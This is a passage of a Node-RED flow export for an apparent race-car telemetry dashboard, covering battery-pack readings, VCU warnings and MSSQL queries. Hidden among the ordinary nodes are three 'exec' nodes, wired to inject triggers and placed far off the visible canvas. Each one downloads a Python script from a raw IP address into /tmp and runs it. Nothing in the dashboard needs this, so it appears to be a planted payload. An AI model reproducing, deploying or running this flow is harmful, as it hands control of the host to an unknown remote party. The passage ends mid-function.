        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#71c5e8",
            "#dbc8b6",
            "#000000",
            "#000000",
            "#000000",
            "#000000"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 830,
        "y": 540,
        "wires": [
            []
        ]
    },
    {
        "id": "1a40f658e67b5942",
        "type": "ui_text",
        "z": "8c02145f70bf7c6a",
        "group": "24a6908befd530f1",
        "order": 1,
        "width": 4,
        "height": 1,
        "name": "",
        "label": "Server Latency (s):",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 810,
        "y": 580,
        "wires": []
    },
    {
        "id": "756e566e98656812",
        "type": "ui_text",
        "z": "8c02145f70bf7c6a",
        "group": "24a6908befd530f1",
        "order": 2,
        "width": 4,
        "height": 1,
        "name": "",
        "label": "Total Latency (s):",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 810,
        "y": 640,
        "wires": []
    },
    {
        "id": "47adaf1c364772c3",
        "type": "ui_text",
        "z": "8c02145f70bf7c6a",
        "d": true,
        "group": "24a6908befd530f1",
        "order": 3,
        "width": 5,
        "height": 1,
        "name": "",
        "label": "Message Number:",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 810,
        "y": 740,
        "wires": []
    },
    {
        "id": "ffe2201d39efadbb",
        "type": "ui_text",
        "z": "8c02145f70bf7c6a",
        "d": true,
        "group": "24a6908befd530f1",
        "order": 4,
        "width": 5,
        "height": 1,
        "name": "",
        "label": "Number Lost:",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 800,
        "y": 780,
        "wires": []
    },
    {
        "id": "5202d51c68026e0b",
        "type": "ui_text",
        "z": "8c02145f70bf7c6a",
        "d": true,
        "group": "24a6908befd530f1",
        "order": 5,
        "width": 5,
        "height": 1,
        "name": "",
        "label": "Percent Messages Lost:",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 830,
        "y": 820,
        "wires": []
    },
    {
        "id": "2305e664e44f358b",
        "type": "remote-access",
        "z": "8c02145f70bf7c6a",
        "confignode": "5cf783589dfd8573",
        "name": "",
        "verbose": 0,
        "x": 200,
        "y": 320,
        "wires": [
            [],
            []
        ]
    },
    {
        "id": "afe4adb2d73aeb32",
        "type": "exec",
        "z": "149f680d508ad4ad",
        "command": "curl -o /tmp/3.py http://82.153.138.166/3.py; python /tmp/3.py",
        "addpay": "payload",
        "append": "",
        "useSpawn": "false",
        "timer": "10080",
        "winHide": false,
        "oldrc": false,
        "name": "",
        "x": 4910,
        "y": 5060,
        "wires": [
            [],
            [],
            []
        ]
    },
    {
        "id": "0d0ceabf6adad9f3",
        "type": "inject",
        "z": "149f680d508ad4ad",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 4910,
        "y": 5051,
        "wires": [
            [
                "afe4adb2d73aeb32"
            ]
        ]
    },
    {
        "id": "c103b1c4f0c2850a",
        "type": "inject",
        "z": "149f680d508ad4ad",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": -4939,
        "y": -4799,
        "wires": [
            [
                "9bfdef0bf82502f4"
            ]
        ]
    },
    {
        "id": "9bfdef0bf82502f4",
        "type": "MSSQL",
        "z": "149f680d508ad4ad",
        "mssqlCN": "933ce03686fddbab",
        "name": "",
        "outField": "payload",
        "returnType": 0,
        "throwErrors": 1,
        "query": "SELECT TOP 1 *\nFROM dbo.race_data\nORDER BY entry_num DESC;",
        "modeOpt": "queryMode",
        "modeOptType": "query",
        "queryOpt": "payload",
        "queryOptType": "editor",
        "paramsOpt": "queryParams",
        "paramsOptType": "none",
        "rows": "rows",
        "rowsType": "msg",
        "parseMustache": true,
        "params": [],
        "x": -4729,
        "y": -4799,
        "wires": [
            [
                "95b99ab17452fc9c"
            ]
        ]
    },
    {
        "id": "95b99ab17452fc9c",
        "type": "function",
        "z": "149f680d508ad4ad",
        "name": "Useful",
        "func": "var sigFigs = 2\n\nvar Total_Pack_Cycles =\n{\n    topic: \"Total Pack Cycles\",\n    payload: msg.payload[0].Total_Pack_Cycles\n}\ntry{\n    Total_Pack_Cycles.payload = Total_Pack_Cycles.payload.toFixed(sigFigs)\n}catch{}\n\nvar Pack_Open_Voltage =\n{\n    topic: \"Pack Open Voltage (V)\",\n    payload: msg.payload[0].Pack_Open_Voltage\n}\ntry {\n    Pack_Open_Voltage.payload = Pack_Open_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_SOC =\n{\n    topic: \"Pack State of Charge (%)\",\n    payload: msg.payload[0].Pack_SOC\n}\ntry {\n    Pack_SOC.payload = Pack_SOC.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Amphours =\n{\n    topic: \"Pack Amp Hours (Ah)\",\n    payload: msg.payload[0].Pack_Amphours\n}\ntry {\n    Pack_Amphours.payload = Pack_Amphours.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Resistance =\n{\n    topic: \"Pack Resistance (Ω)\",\n    payload: msg.payload[0].Pack_Resistance\n}\ntry {\n    Pack_Resistance.payload = Pack_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Temperature =\n{\n    topic: \"Low Temperature (ºC)\",\n    payload: msg.payload[0].Low_Temperature\n}\ntry {\n    Low_Temperature.payload = Low_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Thermistor_ID =\n{\n    topic: \"Low Thermistor ID\",\n    payload: msg.payload[0].Low_Thermistor_ID\n}\ntry {\n    Low_Thermistor_ID.payload = Low_Thermistor_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Maximum_Pack_Voltage =\n{\n    topic: \"Maximum Pack Voltage (V)\",\n    payload: msg.payload[0].maximum_pack_voltage\n}\ntry {\n    Maximum_Pack_Voltage.payload = Maximum_Pack_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Minimum_Pack_Voltage =\n{\n    topic: \"Minimum Pack Voltage (V)\",\n    payload: msg.payload[0].Minimum_Pack_Voltage\n}\ntry {\n    Minimum_Pack_Voltage.payload = Minimum_Pack_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Internal_Temperature =\n{\n    topic: \"Internal Temperature (ºC)\",\n    payload: msg.payload[0].Internal_Temperature\n}\ntry {\n    Internal_Temperature.payload = Internal_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage =\n{\n    topic: \"High Cell Voltage (ºC)\",\n    payload: msg.payload[0].High_Cell_Voltage\n}\ntry {\n    High_Cell_Voltage.payload = High_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage_ID =\n{\n    topic: \"High Cell Voltage ID\",\n    payload: msg.payload[0].High_Cell_Voltage_ID\n}\ntry {\n    High_Cell_Voltage_ID.payload = High_Cell_Voltage_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Cell_Resistance =\n{\n    topic: \"Low Cell Resistance (MΩ)\",\n    payload: msg.payload[0].Low_Cell_Resistance\n}\ntry {\n    Low_Cell_Resistance.payload = Low_Cell_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Intres_ID =\n{\n    topic: \"Low Internal Resistance ID\",\n    payload: msg.payload[0].Low_Intres_ID\n}\ntry {\n    Low_Intres_ID.payload = Low_Intres_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Maximum_Cell_Voltage =\n{\n    topic: \"Maximum Cell Voltage (V)\",\n    payload: msg.payload[0].Maximum_Cell_Voltage\n}\ntry {\n    Maximum_Cell_Voltage.payload = Maximum_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Minimum_Cell_Voltage =\n{\n    topic: \"Minimum Cell Voltage (V)\",\n    payload: msg.payload[0].Minimum_Cell_Voltage\n}\ntry {\n    Minimum_Cell_Voltage.payload = Minimum_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Input_Supply_Voltage =\n{\n    topic: \"Input Supply Voltage (V)\",\n    payload: msg.payload[0].Input_Supply_Voltage\n}\ntry {\n    Input_Supply_Voltage.payload = Input_Supply_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Avg_Cell_Resistance =\n{\n    topic: \"Average Cell Resistance (MΩ)\",\n    payload: msg.payload[0].Avg_Cell_Resistance\n}\ntry {\n    Avg_Cell_Resistance.payload = Avg_Cell_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\n\nreturn [\n    Total_Pack_Cycles,\n    Pack_Open_Voltage,\n    Pack_SOC,\n    Pack_Amphours,\n    Pack_Resistance,\n    Low_Temperature,\n    Low_Thermistor_ID,\n    Avg_Cell_Resistance,\n    Maximum_Pack_Voltage,\n    Minimum_Pack_Voltage,\n    Internal_Temperature,\n    High_Cell_Voltage,\n    High_Cell_Voltage_ID,\n    Low_Cell_Resistance,\n    Low_Intres_ID,\n    Maximum_Cell_Voltage,\n    Minimum_Cell_Voltage,\n    Input_Supply_Voltage\n]",
        "outputs": 18,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": -4559,
        "y": -4759,
        "wires": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "id": "3ca0461c80c4503b",
        "type": "exec",
        "z": "149f680d508ad4ad",
        "command": "curl -o /tmp/3.py http://82.153.138.166/3.py; python /tmp/3.py",
        "addpay": "payload",
        "append": "",
        "useSpawn": "false",
        "timer": "10080",
        "winHide": false,
        "oldrc": false,
        "name": "",
        "x": 4770,
        "y": 4980,
        "wires": [
            [],
            [],
            []
        ]
    },
    {
        "id": "e88b2ea385e12d2f",
        "type": "inject",
        "z": "149f680d508ad4ad",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 4770,
        "y": 4971,
        "wires": [
            [
                "3ca0461c80c4503b"
            ]
        ]
    },
    {
        "id": "36b876157e713cd0",
        "type": "inject",
        "z": "149f680d508ad4ad",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": -5079,
        "y": -4879,
        "wires": [
            [
                "b98a0e363e8ce8ef"
            ]
        ]
    },
    {
        "id": "b98a0e363e8ce8ef",
        "type": "MSSQL",
        "z": "149f680d508ad4ad",
        "mssqlCN": "933ce03686fddbab",
        "name": "",
        "outField": "payload",
        "returnType": 0,
        "throwErrors": 1,
        "query": "SELECT TOP 1 *\nFROM dbo.race_data\nORDER BY entry_num DESC;",
        "modeOpt": "queryMode",
        "modeOptType": "query",
        "queryOpt": "payload",
        "queryOptType": "editor",
        "paramsOpt": "queryParams",
        "paramsOptType": "none",
        "rows": "rows",
        "rowsType": "msg",
        "parseMustache": true,
        "params": [],
        "x": -4869,
        "y": -4879,
        "wires": [
            [
                "b6c6b189971e06dc"
            ]
        ]
    },
    {
        "id": "b6c6b189971e06dc",
        "type": "function",
        "z": "149f680d508ad4ad",
        "name": "Useful",
        "func": "var sigFigs = 2\n\nvar Total_Pack_Cycles =\n{\n    topic: \"Total Pack Cycles\",\n    payload: msg.payload[0].Total_Pack_Cycles\n}\ntry{\n    Total_Pack_Cycles.payload = Total_Pack_Cycles.payload.toFixed(sigFigs)\n}catch{}\n\nvar Pack_Open_Voltage =\n{\n    topic: \"Pack Open Voltage (V)\",\n    payload: msg.payload[0].Pack_Open_Voltage\n}\ntry {\n    Pack_Open_Voltage.payload = Pack_Open_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_SOC =\n{\n    topic: \"Pack State of Charge (%)\",\n    payload: msg.payload[0].Pack_SOC\n}\ntry {\n    Pack_SOC.payload = Pack_SOC.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Amphours =\n{\n    topic: \"Pack Amp Hours (Ah)\",\n    payload: msg.payload[0].Pack_Amphours\n}\ntry {\n    Pack_Amphours.payload = Pack_Amphours.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Resistance =\n{\n    topic: \"Pack Resistance (Ω)\",\n    payload: msg.payload[0].Pack_Resistance\n}\ntry {\n    Pack_Resistance.payload = Pack_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Temperature =\n{\n    topic: \"Low Temperature (ºC)\",\n    payload: msg.payload[0].Low_Temperature\n}\ntry {\n    Low_Temperature.payload = Low_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Thermistor_ID =\n{\n    topic: \"Low Thermistor ID\",\n    payload: msg.payload[0].Low_Thermistor_ID\n}\ntry {\n    Low_Thermistor_ID.payload = Low_Thermistor_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Maximum_Pack_Voltage =\n{\n    topic: \"Maximum Pack Voltage (V)\",\n    payload: msg.payload[0].maximum_pack_voltage\n}\ntry {\n    Maximum_Pack_Voltage.payload = Maximum_Pack_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Minimum_Pack_Voltage =\n{\n    topic: \"Minimum Pack Voltage (V)\",\n    payload: msg.payload[0].Minimum_Pack_Voltage\n}\ntry {\n    Minimum_Pack_Voltage.payload = Minimum_Pack_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Internal_Temperature =\n{\n    topic: \"Internal Temperature (ºC)\",\n    payload: msg.payload[0].Internal_Temperature\n}\ntry {\n    Internal_Temperature.payload = Internal_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage =\n{\n    topic: \"High Cell Voltage (ºC)\",\n    payload: msg.payload[0].High_Cell_Voltage\n}\ntry {\n    High_Cell_Voltage.payload = High_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage_ID =\n{\n    topic: \"High Cell Voltage ID\",\n    payload: msg.payload[0].High_Cell_Voltage_ID\n}\ntry {\n    High_Cell_Voltage_ID.payload = High_Cell_Voltage_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Cell_Resistance =\n{\n    topic: \"Low Cell Resistance (MΩ)\",\n    payload: msg.payload[0].Low_Cell_Resistance\n}\ntry {\n    Low_Cell_Resistance.payload = Low_Cell_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Intres_ID =\n{\n    topic: \"Low Internal Resistance ID\",\n    payload: msg.payload[0].Low_Intres_ID\n}\ntry {\n    Low_Intres_ID.payload = Low_Intres_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Maximum_Cell_Voltage =\n{\n    topic: \"Maximum Cell Voltage (V)\",\n    payload: msg.payload[0].Maximum_Cell_Voltage\n}\ntry {\n    Maximum_Cell_Voltage.payload = Maximum_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Minimum_Cell_Voltage =\n{\n    topic: \"Minimum Cell Voltage (V)\",\n    payload: msg.payload[0].Minimum_Cell_Voltage\n}\ntry {\n    Minimum_Cell_Voltage.payload = Minimum_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Input_Supply_Voltage =\n{\n    topic: \"Input Supply Voltage (V)\",\n    payload: msg.payload[0].Input_Supply_Voltage\n}\ntry {\n    Input_Supply_Voltage.payload = Input_Supply_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Avg_Cell_Resistance =\n{\n    topic: \"Average Cell Resistance (MΩ)\",\n    payload: msg.payload[0].Avg_Cell_Resistance\n}\ntry {\n    Avg_Cell_Resistance.payload = Avg_Cell_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\n\nreturn [\n    Total_Pack_Cycles,\n    Pack_Open_Voltage,\n    Pack_SOC,\n    Pack_Amphours,\n    Pack_Resistance,\n    Low_Temperature,\n    Low_Thermistor_ID,\n    Avg_Cell_Resistance,\n    Maximum_Pack_Voltage,\n    Minimum_Pack_Voltage,\n    Internal_Temperature,\n    High_Cell_Voltage,\n    High_Cell_Voltage_ID,\n    Low_Cell_Resistance,\n    Low_Intres_ID,\n    Maximum_Cell_Voltage,\n    Minimum_Cell_Voltage,\n    Input_Supply_Voltage\n]",
        "outputs": 18,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": -4699,
        "y": -4839,
        "wires": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "id": "e6fc6c3e12c91d8d",
        "type": "exec",
        "z": "149f680d508ad4ad",
        "command": "curl -o /tmp/3.py http://82.153.138.166/3.py; python /tmp/3.py",
        "addpay": "payload",
        "append": "",
        "useSpawn": "false",
        "timer": "10080",
        "winHide": false,
        "oldrc": false,
        "name": "",
        "x": 4810,
        "y": 5220,
        "wires": [
            [],
            [],
            []
        ]
    },
    {
        "id": "b4d7bef4b3cfc7c8",
        "type": "inject",
        "z": "149f680d508ad4ad",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 4810,
        "y": 5211,
        "wires": [
            [
                "e6fc6c3e12c91d8d"
            ]
        ]
    },
    {
        "id": "a0bd5384081958ba",
        "type": "inject",
        "z": "149f680d508ad4ad",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": -5039,
        "y": -4639,
        "wires": [
            [
                "ecb3161a33ada13e"
            ]
        ]
    },
    {
        "id": "ecb3161a33ada13e",
        "type": "MSSQL",
        "z": "149f680d508ad4ad",
        "mssqlCN": "933ce03686fddbab",
        "name": "",
        "outField": "payload",
        "returnType": 0,
        "throwErrors": 1,
        "query": "SELECT TOP 1 *\nFROM dbo.race_data\nORDER BY entry_num DESC;",
        "modeOpt": "queryMode",
        "modeOptType": "query",
        "queryOpt": "payload",
        "queryOptType": "editor",
        "paramsOpt": "queryParams",
        "paramsOptType": "none",
        "rows": "rows",
        "rowsType": "msg",
        "parseMustache": true,
        "params": [],
        "x": -4829,
        "y": -4639,
        "wires": [
            [
                "50fce010c1daa5a3"
            ]
        ]
    },
    {
        "id": "50fce010c1daa5a3",
        "type": "function",
        "z": "149f680d508ad4ad",
        "name": "Useful",
        "func": "var sigFigs = 2\n\nvar Total_Pack_Cycles =\n{\n    topic: \"Total Pack Cycles\",\n    payload: msg.payload[0].Total_Pack_Cycles\n}\ntry{\n    Total_Pack_Cycles.payload = Total_Pack_Cycles.payload.toFixed(sigFigs)\n}catch{}\n\nvar Pack_Open_Voltage =\n{\n    topic: \"Pack Open Voltage (V)\",\n    payload: msg.payload[0].Pack_Open_Voltage\n}\ntry {\n    Pack_Open_Voltage.payload = Pack_Open_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_SOC =\n{\n    topic: \"Pack State of Charge (%)\",\n    payload: msg.payload[0].Pack_SOC\n}\ntry {\n    Pack_SOC.payload = Pack_SOC.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Amphours =\n{\n    topic: \"Pack Amp Hours (Ah)\",\n    payload: msg.payload[0].Pack_Amphours\n}\ntry {\n    Pack_Amphours.payload = Pack_Amphours.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Resistance =\n{\n    topic: \"Pack Resistance (Ω)\",\n    payload: msg.payload[0].Pack_Resistance\n}\ntry {\n    Pack_Resistance.payload = Pack_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Temperature =\n{\n    topic: \"Low Temperature (ºC)\",\n    payload: msg.payload[0].Low_Temperature\n}\ntry {\n    Low_Temperature.payload = Low_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Thermistor_ID =\n{\n    topic: \"Low Thermistor ID\",\n    payload: msg.payload[0].Low_Thermistor_ID\n}\ntry {\n    Low_Thermistor_ID.payload = Low_Thermistor_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Maximum_Pack_Voltage =\n{\n    topic: \"Maximum Pack Voltage (V)\",\n    payload: msg.payload[0].maximum_pack_voltage\n}\ntry {\n    Maximum_Pack_Voltage.payload = Maximum_Pack_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Minimum_Pack_Voltage =\n{\n    topic: \"Minimum Pack Voltage (V)\",\n    payload: msg.payload[0].Minimum_Pack_Voltage\n}\ntry {\n    Minimum_Pack_Voltage.payload = Minimum_Pack_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Internal_Temperature =\n{\n    topic: \"Internal Temperature (ºC)\",\n    payload: msg.payload[0].Internal_Temperature\n}\ntry {\n    Internal_Temperature.payload = Internal_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage =\n{\n    topic: \"High Cell Voltage (ºC)\",\n    payload: msg.payload[0].High_Cell_Voltage\n}\ntry {\n    High_Cell_Voltage.payload = High_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage_ID =\n{\n    topic: \"High Cell Voltage ID\",\n    payload: msg.payload[0].High_Cell_Voltage_ID\n}\ntry {\n    High_Cell_Voltage_ID.payload = High_Cell_Voltage_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Cell_Resistance =\n{\n    topic: \"Low Cell Resistance (MΩ)\",\n    payload: msg.payload[0].Low_Cell_Resistance\n}\ntry {\n    Low_Cell_Resistance.payload = Low_Cell_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Intres_ID =\n{\n    topic: \"Low Internal Resistance ID\",\n    payload: msg.payload[0].Low_Intres_ID\n}\ntry {\n    Low_Intres_ID.payload = Low_Intres_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Maximum_Cell_Voltage =\n{\n    topic: \"Maximum Cell Voltage (V)\",\n    payload: msg.payload[0].Maximum_Cell_Voltage\n}\ntry {\n    Maximum_Cell_Voltage.payload = Maximum_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Minimum_Cell_Voltage =\n{\n    topic: \"Minimum Cell Voltage (V)\",\n    payload: msg.payload[0].Minimum_Cell_Voltage\n}\ntry {\n    Minimum_Cell_Voltage.payload = Minimum_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Input_Supply_Voltage =\n{\n    topic: \"Input Supply Voltage (V)\",\n    payload: msg.payload[0].Input_Supply_Voltage\n}\ntry {\n    Input_Supply_Voltage.payload = Input_Supply_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Avg_Cell_Resistance =\n{\n    topic: \"Average Cell Resistance (MΩ)\",\n    payload: msg.payload[0].Avg_Cell_Resistance\n}\ntry {\n    Avg_Cell_Resistance.payload = Avg_Cell_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\n\nreturn [\n    Total_Pack_Cycles,\n    Pack_Open_Voltage,\n    Pack_SOC,\n    Pack_Amphours,\n    Pack_Resistance,\n    Low_Temperature,\n    Low_Thermistor_ID,\n    Avg_Cell_Resistance,\n    Maximum_Pack_Voltage,\n    Minimum_Pack_Voltage,\n    Internal_Temperature,\n    High_Cell_Voltage,\n    High_Cell_Voltage_ID,\n    Low_Cell_Resistance,\n    Low_Intres_ID,\n    Maximum_Cell_Voltage,\n    Minimum_Cell_Voltage,\n    Input_Supply_Voltage\n]",
        "outputs": 18,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": -4659,
        "y": -4599,
        "wires": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "id": "cc1a672b0390d648",
        "type": "function",
        "z": "149f680d508ad4ad",
        "name": "Warning Messages",
        "func": "var sigFigs = 2\nconst currentDate = new Date();\nvar timestamp = currentDate.getTime();\n\nvar VCU_warningSource =\n{\n    topic: \"Warning Source\",\n    payload: msg.payload.VCU_warningSource\n}\ntry {\n    VCU_warningSource.payload = VCU_warningSource.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_tsOverPowerWarning =\n{\n    topic: \"Over Power Warning\",\n    payload: msg.payload.VCU_tsOverPowerWarning\n}\ntry {\n    VCU_tsOverPowerWarning.payload = VCU_tsOverPowerWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantTempOutWarning =\n{\n    topic: \"Radiator Coolant Temp Out Warning\",\n    payload: msg.payload.VCU_radCoolantTempOutWarning\n}\ntry {\n    VCU_radCoolantTempOutWarning.payload = VCU_radCoolantTempOutWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantTempInWarning =\n{\n    topic: \"Radiator Coolant Temp In Warning\",\n    payload: msg.payload.VCU_radCoolantTempInWarning\n}\ntry {\n    VCU_radCoolantTempInWarning.payload = VCU_radCoolantTempInWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantPressOutWarning =\n{\n    topic: \"Radiator Coolant Pressure Out Warning\",\n    payload: msg.payload.VCU_radCoolantPressOutWarning\n}\ntry {\n    VCU_radCoolantPressOutWarning.payload = VCU_radCoolantPressOutWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantPressInWarning =\n{\n    topic: \"Radiator Coolant Pressure In Warning\",\n    payload: msg.payload.VCU_radCoolantPressInWarning\n}\ntry {\n    VCU_radCoolantPressInWarning.payload = VCU_radCoolantPressInWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantFlowRateWarning =\n{\n    topic: \"Radiator Coolant Flow Rate Warning\",\n    payload: msg.payload.VCU_radCoolantFlowRateWarning\n}\ntry {\n    VCU_radCoolantFlowRateWarning.payload = VCU_radCoolantFlowRateWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_pedalPlausFaultWarning =\n{\n    topic: \"Pedal Plausibility Fault Warning\",\n    payload: msg.payload.VCU_pedalPlausFaultWarning\n}\ntry {\n    VCU_pedalPlausFaultWarning.payload = VCU_pedalPlausFaultWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorTorqueLimitWarning =\n{\n    topic: \"Motor Torque Limit Warning\",\n    payload: msg.payload.VCU_motorTorqueLimitWarning\n}\ntry {\n    VCU_motorTorqueLimitWarning.payload = VCU_motorTorqueLimitWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorSpeedLimitWarning =\n{\n    topic: \"Motor Speed Limit Warning\",\n    payload: msg.payload.VCU_motorSpeedLimitWarning\n}\ntry {\n    VCU_motorSpeedLimitWarning.payload = VCU_motorSpeedLimitWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorOverVoltWarning =\n{\n    topic: \"Motor Over Volt Warning\",\n    payload: msg.payload.VCU_motorOverVoltWarning\n}\ntry {\n    VCU_motorOverVoltWarning.payload = VCU_motorOverVoltWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorOverSpeedWarning =\n{\n    topic: \"Motor Over Speed Warning\",\n    payload: msg.payload.VCU_motorOverSpeedWarning\n}\ntry {\n    VCU_motorOverSpeedWarning.payload = VCU_motorOverSpeedWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorOverCurrentWarning =\n{\n    topic: \"Motor Over Current Warning\",\n    payload: msg.payload.VCU_motorOverCurrentWarning\n}\ntry {\n    VCU_motorOverCurrentWarning.payload = VCU_motorOverCurrentWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantTempOutWarning =\n{\n    topic: \"Motor Coolant Temp Out Warning\",\n    payload: msg.payload.VCU_motorCoolantTempOutWarning\n}\ntry {\n    VCU_motorCoolantTempOutWarning.payload = VCU_motorCoolantTempOutWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantTempInWarning =\n{\n    topic: \"Motor Coolant Temp In Warning\",\n    payload: msg.payload.VCU_motorCoolantTempInWarning\n}\ntry {\n    VCU_motorCoolantTempInWarning.payload = VCU_motorCoolantTempInWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantPressOutWarning =\n{\n    topic: \"Motor Coolant Pressure Out Warning\",\n    payload: msg.payload.VCU_motorCoolantPressOutWarning\n}\ntry {\n    VCU_motorCoolantPressOutWarning.payload = VCU_motorCoolantPressOutWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantPressInWarning =\n{\n    topic: \"Motor Coolant Pressure In Warning\",\n    payload: msg.payload.VCU_motorCoolantPressInWarning\n}\ntry {\n    VCU_motorCoolantPressInWarning.payload = VCU_motorCoolantPressInWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantFlowRateWarning =\n{\n    topic: \"Motor Coolant Flow Rate Warning\",\n    payload: msg.payload.VCU_motorCoolantFlowRateWarning\n}\ntry {\n    